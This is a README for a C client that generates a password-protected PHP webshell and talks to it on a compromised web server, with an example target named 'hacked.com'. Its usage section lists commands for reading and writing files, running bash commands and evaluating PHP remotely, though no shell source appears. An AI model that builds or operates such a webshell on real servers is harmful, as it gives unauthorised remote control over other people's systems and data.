# CW3B5H3ll

CWebshell is a C client for a Php Webshell , to send commands and receive responses.

## Installation

Compile the main.c with [gcc](https://gcc.gnu.org/).

```bash
gcc main.c -o client -Werror -Wall -Wextra
```

## Usage

To generate the webshell :

```bash
./client generate <password>
```

To connect to the webshell :

```bash
./client connect <http> <www.hacked.com/webshell.php> <password>
```
C client commands :

```bash
fread:<filename> ==> to read <filename>.

fwrite:<filename>:<content> ==> to write <content> into <filename>.

exec:<command> ==> to execute bash commands. 

eval:<script> ==> to execute php script.
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.
